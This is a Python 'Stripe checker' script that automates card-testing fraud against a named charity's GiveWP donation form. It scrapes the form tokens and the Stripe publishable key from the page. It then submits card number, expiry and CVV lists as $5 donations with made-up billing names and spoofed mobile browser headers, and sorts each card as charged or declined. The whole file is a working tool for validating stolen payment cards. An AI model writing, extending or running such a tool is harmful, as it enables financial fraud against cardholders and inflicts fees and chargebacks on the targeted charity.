import requests, re, random, sys, os, time, base64
from html import unescape
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

SITE_URL = 'https://maxcurefoundation.org/donations/donate/'
BASE_URL = 'https://maxcurefoundation.org'
CLEAN_URL = 'https://maxcurefoundation.org/donations/donate/'
IFRAME_URL = '' or SITE_URL
UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
DOMAIN = 'maxcurefoundation.org'
BROWSER_COOKIES = {}

def extract_data():
    s = requests.Session()
    s.verify = False
    if BROWSER_COOKIES:
        for ck, cv in BROWSER_COOKIES.items():
            s.cookies.set(ck, cv, domain=DOMAIN)
    headers = {'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
    r = s.get(IFRAME_URL, headers=headers, timeout=30)
    html = r.text
    if 'givewp-route=donation-form-view' in html and 'givewp-route-signature' not in html:
        fid = re.search(r'form-id[=]+(\d+)', html)
        if fid:
            iframe = f'{BASE_URL}/?givewp-route=donation-form-view&form-id={fid.group(1)}'
            r2 = s.get(iframe, headers=headers, timeout=30)
            html = r2.text
    fp = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
    fi = re.search(r'name="give-form-id" value="(.*?)"', html)
    nc = re.search(r'name="give-form-hash" value="(.*?)"', html)
    pk = re.search(r'(pk_live_[A-Za-z0-9_-]+)', html)
    if not all([fp, fi, nc, pk]):
        return None
    sa = re.search(r'(acct_[A-Za-z0-9]+)', html)
    return {
        'fp': fp.group(1), 'fi': fi.group(1), 'nc': nc.group(1),
        'pk': pk.group(1), 'sa': sa.group(1) if sa else '',
        'session': s
    }

def extract_stripe_response(text):
    error_div = re.search(r'class="give_notices give_errors">(.*?)</div>\s*</div>', text, re.DOTALL)
    if error_div:
        raw_error = error_div.group(1)
        clean_error = re.sub(r'<[^>]+>', '', raw_error)
        clean_error = unescape(clean_error).strip()
        clean_error = re.sub(r'\s+', ' ', clean_error)
        clean_error = clean_error.replace('Error:', '').strip()
        if 'Your card was declined' in clean_error: return f"Declined | {clean_error}"
        elif 'insufficient funds' in clean_error.lower(): return f"Declined | {clean_error}"
        elif 'security code is incorrect' in clean_error.lower(): return f"Declined | {clean_error}"
        elif 'card number is incorrect' in clean_error.lower(): return f"Declined | {clean_error}"
        elif 'expiration' in clean_error.lower(): return f"Declined | {clean_error}"
        elif 'processing error' in clean_error.lower(): return f"Declined | {clean_error}"
        elif 'lost' in clean_error.lower() or 'stolen' in clean_error.lower(): return f"Declined | {clean_error}"
        elif 'fraud' in clean_error.lower(): return f"Declined | {clean_error}"
        elif 'do not honor' in clean_error.lower(): return f"Declined | {clean_error}"
        elif 'minimum donation' in clean_error.lower(): return f"Gateway Error | {clean_error}"
        elif 'robot' in clean_error.lower() or 'captcha' in clean_error.lower(): return f"Gateway Error | {clean_error}"
        else: return f"Stripe Response | {clean_error}"
    if 'give-donation-confirmation' in text or 'donation-confirmation' in text: return "Charged | Donation confirmed"
    if 'Thank you for your donation' in text: return "Charged | Thank you for your donation"
    if 'receipt' in text.lower() and 'donation' in text.lower() and 'give_error' not in text: return "Charged | Payment succeeded"
    notice_div = re.search(r'class="give_notices[^"]*">(.*?)</div>', text, re.DOTALL)
    if notice_div:
        cn = re.sub(r'<[^>]+>', '', notice_div.group(1))
        cn = unescape(cn).strip()
        cn = re.sub(r'\s+', ' ', cn)
        return f"Stripe Response | {cn}"
    return "Unknown Response"

def check_card(ccx):
    ccx = ccx.strip()
    parts = ccx.split('|')
    if len(parts) < 4: return 'INVALID_FORMAT'
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    yy_short = yy if len(yy) == 2 else yy[-2:]
    email = f'riva{random.randint(100,999)}@gmail.com'
    d = extract_data()
    if not d: return 'EXTRACT_FAILED | Could not get form data from site'
    s = d['session']
    fp, fi, nc, pk, sa = d['fp'], d['fi'], d['nc'], d['pk'], d['sa']
    sa_param = f'&_stripe_account={sa}' if sa else ''
    headers_ajax = {
        'origin': BASE_URL, 'referer': SITE_URL,
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
        'user-agent': UA, 'x-requested-with': 'XMLHttpRequest',
    }
    data_ajax = {
        'give-honeypot': '', 'give-form-id-prefix': fp, 'give-form-id': fi,
        'give-form-title': 'Give a Donation', 'give-current-url': SITE_URL,
        'give-form-url': SITE_URL, 'give-form-minimum': '5.00',
        'give-form-maximum': '999999.99', 'give-form-hash': nc,
        'give-price-id': 'custom', 'give-amount': '5.00',
        'give_stripe_payment_method': '', 'payment-mode': 'stripe',
        'give_first': 'riva', 'give_last': 'riva', 'give_email': email,
        'give_comment': '', 'card_name': 'riva', 'billing_country': 'US',
        'card_address': 'riva sj', 'card_address_2': '', 'card_city': 'tomrr',
        'card_state': 'NY', 'card_zip': '10090', 'give_action': 'purchase',
        'give-gateway': 'stripe', 'action': 'give_process_donation', 'give_ajax': 'true',
    }
    s.post(f'{BASE_URL}/wp-admin/admin-ajax.php', headers=headers_ajax, data=data_ajax, timeout=30)
    headers_stripe = {
        'authority': 'api.stripe.com', 'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site',
        'user-agent': UA,
    }
    stripe_data = f'type=card&billing_details[name]=riva++riva+&billing_details[email]={email}&billing_details[address][line1]=riva+sj&billing_details[address][line2]=&billing_details[address][city]=tomrr&billing_details[address][state]=NY&billing_details[address][postal_code]=10090&billing_details[address][country]=US&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy_short}&guid=d4c7a0fe-24a0-4c2f-9654-3081cfee930d&muid=3b562720-d431-4fa4-b092-278d4639a6f3&sid=70a0ddd2-988f-425f-9996-372422a311c4&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+split-card-element&referrer={CLEAN_URL}&time_on_page=85758&key={pk}{sa_param}'
    e = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=stripe_data, timeout=30)
    sr = e.json()
    if 'error' in sr:
        em = sr['error'].get('message', 'Unknown')
        ec = sr['error'].get('code', 'unknown')
        ed = sr['error'].get('decline_code', '')
        return f"Stripe Error | Code: {ec} | Decline: {ed} | Message: {em}"
    pm_id = sr['id']
    headers_final = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': BASE_URL, 'referer': SITE_URL,
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1', 'user-agent': UA,
    }
    params_final = {'payment-mode': 'stripe', 'form-id': fi}
    data_final = {
        'give-honeypot': '', 'give-form-id-prefix': fp, 'give-form-id': fi,
        'give-form-title': 'Give a Donation', 'give-current-url': SITE_URL,
        'give-form-url': SITE_URL, 'give-form-minimum': '5.00',
        'give-form-maximum': '999999.99', 'give-form-hash': nc,
        'give-price-id': 'custom', 'give-amount': '5.00',
        'give_stripe_payment_method': pm_id, 'payment-mode': 'stripe',
        'give_first': 'riva', 'give_last': 'riva', 'give_email': email,
        'give_comment': '', 'card_name': 'riva', 'billing_country': 'US',
        'card_address': 'riva sj', 'card_address_2': '', 'card_city': 'tomrr',
        'card_state': 'NY', 'card_zip': '10090', 'give_action': 'purchase',
        'give-gateway': 'stripe',
    }
    r4 = s.post(CLEAN_URL, params=params_final, headers=headers_final, data=data_final, timeout=30)
    return extract_stripe_response(r4.text)

def main():
    print('    Stripe Checker - By Riva - @F_S_G')
    print()
    print('  [1] Single Card')
    print('  [2] Combo File')
    print()
    choice = input('  Select mode: ').strip()
    print()
    if choice == '1':
        card = input('  Enter card (cc|mm|yy|cvv): ').strip()
        result = check_card(card)
        print(f'  Result: {result}')
    elif choice == '2':
        fpath = input('  Enter file path: ').strip()
        if not os.path.exists(fpath):
            print('  File not found')
            return
        with open(fpath, 'r') as f:
            cards = [l.strip() for l in f if '|' in l]
        print(f'  Loaded {len(cards)} cards')
        print('  ------------------------------------')
        charged = declined = errors = 0
        for i, card in enumerate(cards, 1):
            result = check_card(card)
            status = 'CHARGED' if 'charged' in result.lower() else ('DECLINED' if any(x in result.lower() for x in ['declined', 'error', 'response']) else 'UNKNOWN')
            if status == 'CHARGED': charged += 1
            elif status == 'DECLINED': declined += 1
            else: errors += 1
            print(f'  [{i}/{len(cards)}] {card[:20]}... | {status} | {result}')
            time.sleep(1)
        print('  ------------------------------------')
        print(f'  Charged: {charged} | Declined: {declined} | Errors: {errors}')
    else:
        print('  Invalid choice')

if __name__ == '__main__':
    main()
